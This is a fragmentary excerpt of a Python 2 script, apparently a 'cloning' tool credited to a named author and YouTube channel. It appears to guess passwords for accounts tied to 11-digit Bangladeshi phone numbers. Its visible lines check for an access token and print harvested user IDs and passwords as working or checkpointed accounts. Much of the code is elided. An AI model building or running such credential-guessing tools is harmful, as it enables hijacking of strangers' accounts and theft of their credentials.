...
psb('\x1b[1;32mBANGLADESH REDUAN 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : REDUAN AHMED'

    print 'YOUTUBE : RAHITECH BD'

    print 'GITHUB     : github.com/King-X01'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Reduan-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[REDUAN-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
